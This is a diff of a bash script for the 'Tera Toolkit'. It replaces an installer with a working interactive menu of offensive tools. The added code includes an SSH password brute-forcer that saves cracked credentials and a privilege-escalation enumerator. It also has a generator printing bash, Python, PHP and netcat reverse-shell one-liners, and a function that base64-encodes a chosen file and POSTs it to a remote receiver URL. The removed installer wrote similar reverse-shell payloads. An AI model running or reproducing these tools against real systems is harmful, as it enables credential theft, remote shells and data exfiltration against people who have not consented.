@@ -1,146 +1,3 @@
-#!/bin/bash
-
-# ==============================================================================
-# Tera Toolkit - Complete Installation Script
-# For Termux, Linux, macOS
-# ==============================================================================
-
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-BLUE='\033[0;34m'
-YELLOW='\033[1;33m'
-CYAN='\033[0;36m'
-MAGENTA='\033[0;35m'
-NC='\033[0m'
-BOLD='\033[1m'
-
-# Banner
-echo -e "${MAGENTA}"
-cat << "EOF"
-    ╔═══════════════════════════════════════════════════╗
-    ║                                                   ║
-    ║        
-    ║                TERA (I ❤️ yall)
-    ║                v3.0.                          ║
-    ║                                                   ║
-    ╚═══════════════════════════════════════════════════╝
-EOF
-echo -e "${NC}"
-echo ""
-
-# Check if running as root
-if [[ $EUID -eq 0 ]]; then
-    echo -e "${YELLOW}[!] Running as root${NC}"
-fi
-
-# Function to print section header
-section() {
-    echo -e "${CYAN}"
-    echo "════════════════════════════════════════════════════"
-    echo "  $1"
-    echo "════════════════════════════════════════════════════"
-    echo -e "${NC}"
-}
-
-# Function to install dependencies
-install_deps() {
-    section "Installing Dependencies"
-    
-    # Detect OS
-    if [[ -f /etc/os-release ]]; then
-        source /etc/os-release
-        OS=$ID
-    elif [[ $(uname) == "Darwin" ]]; then
-        OS="macos"
-    elif [[ $(uname -o) == "Android" ]]; then
-        OS="termux"
-    else
-        OS="unknown"
-    fi
-    
-    echo -e "${YELLOW}[*] Detected OS: $OS${NC}"
-    
-    case $OS in
-        "termux")
-            echo -e "${GREEN}[*] Setting up Termux...${NC}"
-            pkg update -y && pkg upgrade -y
-            pkg install -y curl wget nmap python python-pip git zip unzip \
-                bash coreutils util-linux man tree tar grep sed gawk \
-                libxml2 libxslt libiconv readline ncurses-utils \
-                ruby perl php nodejs-lts
-            pip install --upgrade pip
-            gem install lolcat 2>/dev/null || echo "Ruby gems optional"
-            ;;
-            
-        "debian"|"ubuntu"|"kali"|"parrot")
-            echo -e "${GREEN}[*] Setting up Debian-based system...${NC}"
-            sudo apt update && sudo apt upgrade -y
-            sudo apt install -y curl wget nmap smbclient sshpass tcpdump \
-                fping jq python3 python3-pip git zip unzip net-tools \
-                dnsutils whois hydra medusa netcat-traditional \
-                nikto sqlmap dirb gobuster seclists golang ruby \
-                perl php nodejs npm
-            sudo pip3 install --upgrade pip
-            ;;
-            
-        "fedora"|"centos"|"rhel")
-            echo -e "${GREEN}[*] Setting up RHEL-based system...${NC}"
-            sudo dnf update -y || sudo yum update -y
-            sudo dnf install -y curl wget nmap samba-client sshpass \
-                tcpdump fping jq python3 python3-pip git zip unzip \
-                net-tools bind-utils whois ruby perl php nodejs npm || \
-            sudo yum install -y curl wget nmap samba-client sshpass \
-                tcpdump fping jq python3 python3-pip git zip unzip \
-                net-tools bind-utils whois ruby perl php nodejs npm
-            sudo pip3 install --upgrade pip
-            ;;
-            
-        "arch"|"manjaro")
-            echo -e "${GREEN}[*] Setting up Arch-based system...${NC}"
-            sudo pacman -Syu --noconfirm
-            sudo pacman -S --noconfirm curl wget nmap smbclient sshpass \
-                tcpdump fping jq python python-pip git zip unzip \
-                net-tools bind whois ruby perl php nodejs npm
-            pip install --upgrade pip
-            ;;
-            
-        "macos")
-            echo -e "${GREEN}[*] Setting up macOS...${NC}"
-            # Check for Homebrew
-            if ! command -v brew &> /dev/null; then
-                echo -e "${YELLOW}[*] Installing Homebrew...${NC}"
-                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
-            fi
-            brew update
-            brew install curl wget nmap samba sshpass tcpdump fping jq \
-                python3 git zip unzip netcat whois ruby perl php node
-            brew tap homebrew/cask
-            pip3 install --upgrade pip
-            ;;
-            
-        *)
-            echo -e "${RED}[!] Unsupported OS. Please install manually.${NC}"
-            echo "Required packages: curl, wget, nmap, python3, git"
-            exit 1
-            ;;
-    esac
-    
-    echo -e "${GREEN}[✓] Dependencies installed${NC}"
-}
-
-# Function to download and setup Tera Toolkit
-setup_tera() {
-    section "Downloading Tera Toolkit"
-    
-    # Create directory
-    mkdir -p ~/tera-toolkit
-    cd ~/tera-toolkit
-    
-    # Download the main script from GitHub
-    echo -e "${YELLOW}[*] Getting Tera Toolkit...${NC}"
-    
-    # Create the main Tera script
-    cat > tera.sh << 'EOF'
 #!/usr/bin/env bash
 
 # ==============================================================================
@@ -163,16 +20,21 @@ MAGENTA='\033[0;35m'
 NC='\033[0m'
 BOLD='\033[1m'
 
+# --- Logging ---
+log() {
+    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
+}
+
 # --- Banner ---
 show_banner() {
     clear
     echo -e "${MAGENTA}"
-    cat << "EOF"
-    ╔══════════════════════════════════════════════════════════╗
-    ║                         TERA.                                                 |
-    ║                       Version 3.0    (I love yall ❤️)           |
-    ╚══════════════════════════════════════════════════════════╝
-EOF
+    echo "    ╔═══════════════════════════════════════════════════╗"
+    echo "    ║                                                   ║"
+    echo "    ║                TERA (I ❤️ yall)                  ║"
+    echo "    ║                v${VERSION}                               ║"
+    echo "    ║                                                   ║"
+    echo "    ╚═══════════════════════════════════════════════════╝"
     echo -e "${NC}"
     echo -e "${CYAN}    [*] Type 'help' for commands or select a tool${NC}"
     echo ""
@@ -201,10 +63,419 @@ show_help() {
     echo -e "${YELLOW}═══════════════════════════════════════════════════════${NC}"
 }
 
-# ... [Rest of the Tera toolkit functions would go here]
-# For brevity, I'm showing the structure - you would paste the full toolkit code here
+# --- Input Validation ---
+validate_ip() {
+    local ip=$1
+    local stat=1
+    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+        IFS='.' read -r -a octets <<< "$ip"
+        [[ ${octets[0]} -le 255 && ${octets[1]} -le 255 && ${octets[2]} -le 255 && ${octets[3]} -le 255 ]]
+        stat=$?
+    fi
+    return $stat
+}
 
-# Main menu function
+# --- 1. Port Scanner ---
+port_scanner() {
+    echo -e "${BLUE}[*] Tera Port Scanner${NC}"
+    read -p "Target IP/Domain: " target
+    read -p "Range (e.g. 1-1000): " range
+    read -p "Protocol (tcp/udp/both) [tcp]: " protocol
+    protocol=${protocol:-tcp}
+    
+    IFS='-' read -r start end <<< "$range"
+    if [[ -z $start ]] || [[ -z $end ]]; then
+        log "[ERROR] Invalid port range"
+        return 1
+    fi
+    
+    echo -e "${BLUE}[*] Scanning $target ($protocol)...${NC}"
+    
+    scan_tcp() {
+        local port=$1
+        timeout $TIMEOUT bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null && \
+        echo -e "${GREEN}[+] TCP/$port Open${NC}"
+    }
+    
+    export -f scan_tcp
+    export target TIMEOUT GREEN NC
+    
+    if [[ $protocol == "tcp" ]] || [[ $protocol == "both" ]]; then
+        echo -e "${YELLOW}[*] Scanning TCP ports...${NC}"
+        seq $start $end | xargs -I {} -P $THREADS bash -c 'scan_tcp "$@"' _ {}
+    fi
+    
+    if [[ $protocol == "udp" ]] || [[ $protocol == "both" ]]; then
+        echo -e "${YELLOW}[*] Scanning UDP ports...${NC}"
+        for port in $(seq $start $end); do
+            timeout $TIMEOUT bash -c "echo '' > /dev/udp/$target/$port" 2>/dev/null && \
+            echo -e "${GREEN}[+] UDP/$port Open${NC}" &
+        done
+        wait
+    fi
+}
+
+# --- 2. Directory Brute ---
+dir_brute() {
+    echo -e "${BLUE}[*] Directory Bruteforce${NC}"
+    read -p "URL: " url
+    read -p "Wordlist [common.txt]: " wl
+    wl=${wl:-common.txt}
+    
+    [[ $url != http* ]] && url="http://$url"
+    
+    echo -e "${BLUE}[*] Starting directory brute on $url${NC}"
+    
+    while read -r dir; do
+        status=$(curl -s -o /dev/null -w "%{http_code}" -L "$url/$dir/" 2>/dev/null)
+        if [[ "$status" =~ ^(200|301|302|403)$ ]]; then
+            echo -e "${GREEN}[+] /$dir/ ($status)${NC}"
+        fi
+    done < "$wl" | head -50
+}
+
+# --- 3. SMB Enumerator ---
+smb_enum() {
+    echo -e "${BLUE}[*] SMB Enumerator${NC}"
+    read -p "Target IP: " ip
+    
+    if ! validate_ip "$ip"; then
+        echo -e "${RED}[!] Invalid IP address${NC}"
+        return 1
+    fi
+    
+    echo -e "${YELLOW}[*] Trying SMB client...${NC}"
+    if command -v smbclient &> /dev/null; then
+        echo -e "${CYAN}[-] Null session:${NC}"
+        smbclient -L "//$ip/" -N 2>/dev/null || echo "Null session failed"
+    else
+        echo -e "${RED}[!] smbclient not installed${NC}"
+    fi
+}
+
+# --- 4. Subdomain Finder ---
+sub_finder() {
+    echo -e "${BLUE}[*] Subdomain Finder${NC}"
+    read -p "Domain (e.g. example.com): " dom
+    read -p "Wordlist [subdomains.txt]: " wl
+    wl=${wl:-subdomains.txt}
+    
+    echo -e "${BLUE}[*] Hunting subdomains for $dom...${NC}"
+    
+    found_count=0
+    while read -r sub; do
+        host="$sub.$dom"
+        if host "$host" > /dev/null 2>&1; then
+            echo -e "${GREEN}[+] Found: $host${NC}"
+            ((found_count++))
+        fi
+    done < "$wl"
+    
+    echo -e "${YELLOW}[*] Found $found_count subdomains${NC}"
+}
+
+# --- 5. SSH Brute Force ---
+ssh_brute() {
+    echo -e "${BLUE}[*] SSH Brute Force${NC}"
+    read -p "Target IP: " ip
+    read -p "Username [root]: " user
+    user=${user:-root}
+    read -p "Wordlist [passwords.txt]: " wl
+    wl=${wl:-passwords.txt}
+    
+    if ! validate_ip "$ip"; then
+        echo -e "${RED}[!] Invalid IP address${NC}"
+        return 1
+    fi
+    
+    # Check if SSH is open
+    if ! timeout 2 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null; then
+        echo -e "${RED}[!] Port 22 closed${NC}"
+        return 1
+    fi
+    
+    echo -e "${GREEN}[+] SSH port open, starting brute...${NC}"
+    
+    attempt=0
+    while read -r pass; do
+        ((attempt++))
+        echo -ne "${BLUE}[*] Attempt $attempt: $pass\r${NC}"
+        
+        if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
+           -o ConnectTimeout=3 \
+           -o PasswordAuthentication=yes \
+           "$user@$ip" "exit" 2>/dev/null; then
+            echo -e "\n${GREEN}[!] SUCCESS: $user:$pass${NC}"
+            echo "$user:$pass" >> "found_ssh_$ip.txt"
+            return 0
+        fi
+    done < "$wl"
+    
+    echo -e "\n${RED}[!] No valid credentials found${NC}"
+}
+
+# --- 6. Privilege Escalation Check ---
+priv_esc_check() {
+    echo -e "${BLUE}[*] Privilege Escalation Check${NC}"
+    
+    # System Info
+    echo -e "${YELLOW}--- System Information ---${NC}"
+    uname -a
+    [[ -f /etc/os-release ]] && cat /etc/os-release 2>/dev/null | head -5
+    
+    # Users
+    echo -e "${YELLOW}--- Users & Groups ---${NC}"
+    echo "Current user: $(whoami)"
+    echo "UID: $(id -u)"
+    echo "Groups: $(id -Gn)"
+    
+    # SUID Binaries
+    echo -e "${YELLOW}--- SUID Binaries ---${NC}"
+    find / -perm -4000 -type f 2>/dev/null | head -20
+    
+    # Writable Files
+    echo -e "${YELLOW}--- Writable Directories ---${NC}"
+    find / -writable -type d 2>/dev/null | grep -v -E '(proc|sys|dev)' | head -10
+    
+    # Cron Jobs
+    echo -e "${YELLOW}--- Cron Jobs ---${NC}"
+    crontab -l 2>/dev/null || echo "No user cron"
+    
+    # Network
+    echo -e "${YELLOW}--- Network Info ---${NC}"
+    ip a 2>/dev/null | head -20 || ifconfig 2>/dev/null | head -20
+    
+    echo -e "${GREEN}[+] Check complete${NC}"
+}
+
+# --- 7. Web Crawler ---
+web_crawler() {
+    echo -e "${BLUE}[*] Web Crawler${NC}"
+    read -p "URL: " url
+    read -p "Depth [1]: " depth
+    depth=${depth:-1}
+    
+    [[ $url != http* ]] && url="http://$url"
+    
+    echo -e "${YELLOW}[*] Crawling: $url${NC}"
+    
+    # Extract links
+    links=$(curl -s "$url" | grep -oP 'href="\K[^"]+' | sort -u)
+    
+    for link in $links; do
+        echo -e "${GREEN}[+] $link${NC}"
+    done
+}
+
+# --- 8. Reverse Shell Generator ---
+rev_gen() {
+    echo -e "${BLUE}[*] Reverse Shell Generator${NC}"
+    read -p "LHOST: " lh
+    read -p "LPORT: " lp
+    
+    echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
+    echo -e "${YELLOW}Bash:${NC}"
+    echo "bash -i >& /dev/tcp/$lh/$lp 0>&1"
+    echo ""
+    echo -e "${YELLOW}Python:${NC}"
+    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lh\",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    echo ""
+    echo -e "${YELLOW}PHP:${NC}"
+    echo "php -r '\$sock=fsockopen(\"$lh\",$lp);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    echo ""
+    echo -e "${YELLOW}Netcat:${NC}"
+    echo "nc -e /bin/sh $lh $lp"
+    echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
+}
+
+# --- 9. Packet Sniffer ---
+packet_sniff() {
+    echo -e "${BLUE}[*] Packet Sniffer${NC}"
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}[!] Requires root privileges${NC}"
+        return 1
+    fi
+    
+    if ! command -v tcpdump &> /dev/null; then
+        echo -e "${RED}[!] tcpdump not found${NC}"
+        return 1
+    fi
+    
+    read -p "Interface [eth0]: " int
+    int=${int:-eth0}
+    read -p "Filter [tcp port 80]: " filter
+    filter=${filter:-"tcp port 80"}
+    
+    echo -e "${YELLOW}[*] Starting capture on $int...${NC}"
+    echo -e "${CYAN}[*] Press Ctrl+C to stop${NC}"
+    
+    trap 'echo -e "\n${GREEN}[+] Capture stopped${NC}"' INT
+    
+    tcpdump -i "$int" -A -s 0 "$filter"
+}
+
+# --- 10. Data Exfiltration ---
+exfiltrate() {
+    echo -e "${BLUE}[*] Data Exfiltration${NC}"
+    read -p "File to exfiltrate: " file
+    
+    if [[ ! -f "$file" ]]; then
+        echo -e "${RED}[!] File not found${NC}"
+        return 1
+    fi
+    
+    read -p "Receiver URL: " r_url
+    data=$(base64 -w 0 "$file" 2>/dev/null || base64 "$file")
+    filename=$(basename "$file")
+    curl -X POST -H "Content-Type: application/json" \
+         -d "{\"filename\":\"$filename\",\"data\":\"$data\"}" \
+         "$r_url" 2>/dev/null && echo -e "${GREEN}[+] Sent via HTTP${NC}" || echo -e "${RED}[!] Failed to send${NC}"
+}
+
+# --- 11. Network Discovery ---
+ping_sweep() {
+    echo -e "${BLUE}[*] Network Discovery${NC}"
+    read -p "Network CIDR [192.168.1.0/24]: " network
+    network=${network:-192.168.1.0/24}
+    
+    echo -e "${YELLOW}[*] Discovering hosts in $network...${NC}"
+    
+    # Simple ping sweep for /24 networks
+    if [[ $network == *"/24" ]]; then
+        subnet=$(echo "$network" | cut -d'/' -f1 | cut -d'.' -f1-3)
+        for i in {1..254}; do
+            host="$subnet.$i"
+            ping -c 1 -W 1 "$host" > /dev/null 2>&1 && \
+            echo -e "${GREEN}[+] Alive: $host${NC}" &
+        done
+        wait
+    else
+        echo -e "${RED}[!] Only /24 networks supported in simple mode${NC}"
+    fi
+}
+
+# --- 12. Vulnerability Scanner ---
+vuln_scan() {
+    echo -e "${BLUE}[*] Basic Vulnerability Scan${NC}"
+    read -p "Target IP/Domain: " target
+    
+    if validate_ip "$target"; then
+        echo -e "${YELLOW}[*] Scanning $target...${NC}"
+        
+        # Check for open ports
+        echo -e "${CYAN}[*] Port scan...${NC}"
+        for port in 21 22 23 25 80 443 445 3389; do
+            timeout 1 bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null && \
+            echo -e "${GREEN}[+] Port $port open${NC}"
+        done
+    else
+        echo -e "${YELLOW}[*] Testing $target as domain...${NC}"
+        curl -s -I "http://$target" 2>/dev/null | head -5
+    fi
+}
+
+# --- 13. Report Viewer ---
+report_viewer() {
+    echo -e "${BLUE}[*] Report Viewer${NC}"
+    
+    if [[ -f "$LOG_FILE" ]]; then
+        echo -e "${YELLOW}--- Tera Log File ---${NC}"
+        tail -20 "$LOG_FILE"
+    else
+        echo -e "${RED}[!] No log file found${NC}"
+    fi
+    
+    echo -e "${YELLOW}--- Recent Files ---${NC}"
+    ls -la *.txt *.log 2>/dev/null | head -10
+}
+
+# --- 14. Extra Tools ---
+extra_tools() {
+    echo -e "${BLUE}[*] Extra Tools${NC}"
+    echo -e "${CYAN}1) System Information${NC}"
+    echo -e "${CYAN}2) Network Information${NC}"
+    echo -e "${CYAN}3) Process Viewer${NC}"
+    echo -e "${CYAN}4) File Analyzer${NC}"
+    echo -e "${CYAN}5) Hash Generator${NC}"
+    
+    read -p "Select tool [1-5]: " tool_choice
+    
+    case $tool_choice in
+        1)
+            echo -e "${YELLOW}--- System Information ---${NC}"
+            uname -a
+            [[ -f /etc/os-release ]] && cat /etc/os-release
+            free -h 2>/dev/null || echo "Memory info not available"
+            df -h 2>/dev/null | head -5
+            ;;
+        2)
+            echo -e "${YELLOW}--- Network Information ---${NC}"
+            ip addr show 2>/dev/null || ifconfig 2>/dev/null
+            echo ""
+            netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null
+            ;;
+        3)
+            echo -e "${YELLOW}--- Process Viewer ---${NC}"
+            ps aux | head -20
+            ;;
+        4)
+            read -p "File to analyze: " file
+            if [[ -f "$file" ]]; then
+                echo -e "${YELLOW}--- File Analysis ---${NC}"
+                echo "Size: $(du -h "$file" | cut -f1)"
+                echo "Type: $(file "$file")"
+                echo "Lines: $(wc -l < "$file")"
+                echo "MD5: $(md5sum "$file" 2>/dev/null | cut -d' ' -f1 || echo "N/A")"
+            else
+                echo -e "${RED}[!] File not found${NC}"
+            fi
+            ;;
+        5)
+            read -p "Text to hash: " text
+            echo -e "${YELLOW}--- Hash Generator ---${NC}"
+            echo -n "MD5:    " && echo -n "$text" | md5sum 2>/dev/null | cut -d' ' -f1 || echo "N/A"
+            echo -n "SHA1:   " && echo -n "$text" | sha1sum 2>/dev/null | cut -d' ' -f1 || echo "N/A"
+            echo -n "SHA256: " && echo -n "$text" | sha256sum 2>/dev/null | cut -d' ' -f1 || echo "N/A"
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid choice${NC}"
+            ;;
+    esac
+}
+
+# --- Update Function ---
+update_tera() {
+    echo -e "${BLUE}[*] Updating Tera Toolkit...${NC}"
+    echo -e "${YELLOW}[*] This would download the latest version from GitHub${NC}"
+    echo -e "${GREEN}[✓] Update function ready${NC}"
+    echo -e "${CYAN}Note: Actual update requires internet connection${NC}"
+}
+
+# --- Command Handler ---
+handle_command() {
+    case "$1" in
+        "help") show_help ;;
+        "scan") port_scanner ;;
+        "dir") dir_brute ;;
+        "sub") sub_finder ;;
+        "ssh") ssh_brute ;;
+        "priv") priv_esc_check ;;
+        "smb") smb_enum ;;
+        "crawl") web_crawler ;;
+        "shell") rev_gen ;;
+        "sniff") packet_sniff ;;
+        "exfil") exfiltrate ;;
+        "ping") ping_sweep ;;
+        "vuln") vuln_scan ;;
+        "update") update_tera ;;
+        "clear") clear ;;
+        "exit") exit 0 ;;
+        *) echo -e "${RED}[!] Unknown command. Type 'help' for commands.${NC}" ;;
+    esac
+}
+
+# --- Main Menu ---
 main_menu() {
     while true; do
         show_banner
@@ -223,25 +494,32 @@ main_menu() {
         echo "    ╚══════════════════════════════════════════════════════════╝"
         echo -e "${NC}"
         
-        read -p "Select option [0-14]: " choice
+        read -p "Select option [0-14] or type 'help': " choice
         
         case $choice in
-            1) echo "Port Scanner selected" ;;
-            2) echo "Directory Brute selected" ;;
-            3) echo "SMB Enumerator selected" ;;
-            4) echo "Subdomain Finder selected" ;;
-            5) echo "SSH Brute Force selected" ;;
-            6) echo "Privilege Escalation selected" ;;
-            7) echo "Report Viewer selected" ;;
-            8) echo "Reverse Shell Generator selected" ;;
-            9) echo "Packet Sniffer selected" ;;
-            10) echo "Data Exfiltration selected" ;;
-            11) echo "Network Discovery selected" ;;
-            12) echo "Vulnerability Scanner selected" ;;
-            13) echo "Web Crawler selected" ;;
-            14) echo "Extra Tools selected" ;;
+            1) port_scanner ;;
+            2) dir_brute ;;
+            3) smb_enum ;;
+            4) sub_finder ;;
+            5) ssh_brute ;;
+            6) priv_esc_check ;;
+            7) report_viewer ;;
+            8) rev_gen ;;
+            9) packet_sniff ;;
+            10) exfiltrate ;;
+            11) ping_sweep ;;
+            12) vuln_scan ;;
+            13) web_crawler ;;
+            14) extra_tools ;;
             0) echo -e "${GREEN}[*] Exiting Tera Toolkit...${NC}"; exit 0 ;;
-            *) echo -e "${RED}[!] Invalid option${NC}" ;;
+            help) show_help ;;
+            *) 
+                if [[ -n "$choice" ]]; then
+                    handle_command "$choice"
+                else
+                    echo -e "${RED}[!] Invalid option${NC}"
+                fi
+                ;;
         esac
         
         echo -e "\n${YELLOW}Press Enter to continue...${NC}"
@@ -249,393 +527,28 @@ main_menu() {
     done
 }
 
-# Start Tera
-main_menu
-EOF
-
-    # Make executable
-    chmod +x tera.sh
+# --- Check Dependencies ---
+check_deps() {
+    local missing=()
     
-    # Download wordlists
-    echo -e "${YELLOW}[*] Downloading wordlists...${NC}"
-    mkdir -p wordlists
-    
-    # Common wordlists
-    wordlist_urls=(
-        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"
-        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt"
-        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
-        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt"
-    )
-    
-    for url in "${wordlist_urls[@]}"; do
-        filename=$(basename "$url")
-        echo -e "${BLUE}[*] Downloading $filename...${NC}"
-        if command -v curl &> /dev/null; then
-            curl -s -L -o "wordlists/$filename" "$url"
-        else
-            wget -q -O "wordlists/$filename" "$url"
+    # Check for essential commands
+    for cmd in curl wget; do
+        if ! command -v "$cmd" &> /dev/null; then
+            missing+=("$cmd")
         fi
     done
     
-    # Create default wordlist symlinks
-    ln -sf wordlists/common.txt common.txt
-    ln -sf wordlists/subdomains-top1million-5000.txt subdomains.txt
-    ln -sf wordlists/10-million-password-list-top-100.txt passwords.txt
-    
-    # Create configuration file
-    echo -e "${YELLOW}[*] Creating config...${NC}"
-    cat > tera.conf << EOF
-# Tera Toolkit Configuration
-[general]
-name=Tera Toolkit
-version=3.0
-author=Security Enthusiasts
-threads=50
-timeout=2
-log_dir=logs
-color_scheme=default
-
-[wordlists]
-dirs=wordlists/common.txt
-subdomains=wordlists/subdomains-top1million-5000.txt
-passwords=wordlists/10-million-password-list-top-100.txt
-users=wordlists/top-usernames-shortlist.txt
-
-[network]
-default_interface=eth0
-scan_speed=normal
-stealth_mode=false
-proxy_enabled=false
-
-[modules]
-port_scanner=true
-dir_brute=true
-subdomain_hunt=true
-ssh_brute=true
-smb_enum=true
-vuln_scan=true
-web_crawl=true
-
-[ui]
-show_banner=true
-show_colors=true
-animation=true
-EOF
-    
-    echo -e "${GREEN}[✓] Tera Toolkit downloaded${NC}"
-}
-
-# Function to setup Python tools
-setup_python_tools() {
-    section "Installing Python Tools"
-    
-    # Install useful Python packages
-    if command -v pip3 &> /dev/null; then
-        echo -e "${YELLOW}[*] Installing Python packages...${NC}"
-        pip3 install --user requests beautifulsoup4 colorama \
-            python-nmap scapy-python3 paramiko \
-            argparse pyfiglet termcolor
-    elif command -v pip &> /dev/null; then
-        pip install --user requests beautifulsoup4 colorama \
-            python-nmap scapy paramiko \
-            argparse pyfiglet termcolor
+    if [[ ${#missing[@]} -gt 0 ]]; then
+        echo -e "${YELLOW}[!] Missing: ${missing[*]}${NC}"
+        echo -e "${CYAN}[*] Some features may not work properly${NC}"
     fi
-    
-    # Create Python tools directory
-    mkdir -p ~/tera-toolkit/tools/python
-    
-    # Create advanced scanner
-    cat > ~/tera-toolkit/tools/python/tera_scanner.py << 'EOF'
-#!/usr/bin/env python3
-"""
-Tera Advanced Port Scanner
-"""
-import socket
-import threading
-import argparse
-from queue import Queue
-import sys
-import time
-
-class TeraScanner:
-    def __init__(self, target, start_port, end_port, threads=100):
-        self.target = target
-        self.start_port = start_port
-        self.end_port = end_port
-        self.threads = threads
-        self.q = Queue()
-        self.open_ports = []
-        
-    def scan_port(self, port):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            result = sock.connect_ex((self.target, port))
-            if result == 0:
-                self.open_ports.append(port)
-                try:
-                    service = socket.getservbyport(port)
-                except:
-                    service = "unknown"
-                print(f"[+] Port {port}/tcp open - {service}")
-            sock.close()
-        except:
-            pass
-            
-    def worker(self):
-        while True:
-            port = self.q.get()
-            self.scan_port(port)
-            self.q.task_done()
-            
-    def run(self):
-        print(f"[*] Scanning {self.target} ports {self.start_port}-{self.end_port}")
-        print(f"[*] Using {self.threads} threads")
-        start_time = time.time()
-        
-        for _ in range(self.threads):
-            t = threading.Thread(target=self.worker)
-            t.daemon = True
-            t.start()
-            
-        for port in range(self.start_port, self.end_port + 1):
-            self.q.put(port)
-            
-        self.q.join()
-        elapsed = time.time() - start_time
-        
-        print(f"\n[*] Scan completed in {elapsed:.2f} seconds")
-        print(f"[*] Found {len(self.open_ports)} open ports")
-        
-        if self.open_ports:
-            print("[*] Open ports:", sorted(self.open_ports))
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Tera Advanced Port Scanner")
-    parser.add_argument("target", help="Target IP address or hostname")
-    parser.add_argument("-p", "--ports", default="1-1000", help="Port range (e.g., 1-1000)")
-    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads")
-    
-    args = parser.parse_args()
-    
-    if '-' in args.ports:
-        start_port, end_port = map(int, args.ports.split('-'))
-    else:
-        start_port = end_port = int(args.ports)
-    
-    scanner = TeraScanner(args.target, start_port, end_port, args.threads)
-    scanner.run()
-EOF
-    
-    chmod +x ~/tera-toolkit/tools/python/tera_scanner.py
-    
-    echo -e "${GREEN}[✓] Python tools installed${NC}"
 }
 
-# Function to setup extra tools
-setup_extra_tools() {
-    section "Setting Up Extra Tools"
-    
-    # Create tools directory
-    mkdir -p ~/tera-toolkit/tools
-    
-    # Create network tools
-    cat > ~/tera-toolkit/tools/network_info.sh << 'EOF'
-#!/bin/bash
-# Tera Network Information Tool
-
-echo "════════════════════════════════════════════════════"
-echo "                NETWORK INFORMATION"
-echo "════════════════════════════════════════════════════"
-
-echo "[*] IP Addresses:"
-ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "No network info"
-
-echo -e "\n[*] Routing Table:"
-ip route show 2>/dev/null || route -n 2>/dev/null || echo "No routing info"
-
-echo -e "\n[*] Open Connections:"
-ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null || echo "No connection info"
-
-echo -e "\n[*] DNS Servers:"
-cat /etc/resolv.conf 2>/dev/null | grep nameserver || echo "No DNS info"
-EOF
-    
-    chmod +x ~/tera-toolkit/tools/network_info.sh
-    
-    # Create system info tool
-    cat > ~/tera-toolkit/tools/system_info.sh << 'EOF'
-#!/bin/bash
-# Tera System Information Tool
-
-echo "════════════════════════════════════════════════════"
-echo "                SYSTEM INFORMATION"
-echo "════════════════════════════════════════════════════"
-
-echo "[*] OS Information:"
-uname -a
-echo ""
-[[ -f /etc/os-release ]] && cat /etc/os-release | grep -E "^(NAME|VERSION|ID)="
-
-echo -e "\n[*] CPU Information:"
-lscpu 2>/dev/null | grep -E "(Model name|CPU\(s\)|Architecture)" || echo "No CPU info"
-
-echo -e "\n[*] Memory Information:"
-free -h 2>/dev/null || echo "No memory info"
-
-echo -e "\n[*] Disk Usage:"
-df -h 2>/dev/null | head -10 || echo "No disk info"
-
-echo -e "\n[*] Current User:"
-whoami
-id
-EOF
-    
-    chmod +x ~/tera-toolkit/tools/system_info.sh
-    
-    # Create payload generator
-    cat > ~/tera-toolkit/tools/payload_gen.sh << 'EOF'
-#!/bin/bash
-# Tera Payload Generator
-
-echo "════════════════════════════════════════════════════"
-echo "                PAYLOAD GENERATOR"
-echo "════════════════════════════════════════════════════"
-
-read -p "Enter LHOST: " lhost
-read -p "Enter LPORT: " lport
-
-echo ""
-echo "[*] Bash Reverse Shell:"
-echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
-echo ""
-echo "[*] Python Reverse Shell:"
-echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
-echo ""
-echo "[*] PHP Reverse Shell:"
-echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-echo ""
-echo "[*] Netcat Reverse Shell:"
-echo "nc -e /bin/sh $lhost $lport"
-EOF
-    
-    chmod +x ~/tera-toolkit/tools/payload_gen.sh
-    
-    echo -e "${GREEN}[✓] Extra tools installed${NC}"
+# --- Initialization ---
+init() {
+    check_deps
+    main_menu
 }
 
-# Function to setup Termux specifically
-setup_termux() {
-    if [[ $(uname -o) != "Android" ]]; then
-        return
-    fi
-    
-    section "Configuring Termux"
-    
-    # Request storage permission
-    termux-setup-storage
-    
-    # Create shortcuts
-    echo '# Tera Toolkit Aliases' >> ~/.bashrc
-    echo 'alias tera="cd ~/tera-toolkit && ./tera.sh"' >> ~/.bashrc
-    echo 'alias t="./tera.sh"' >> ~/.bashrc
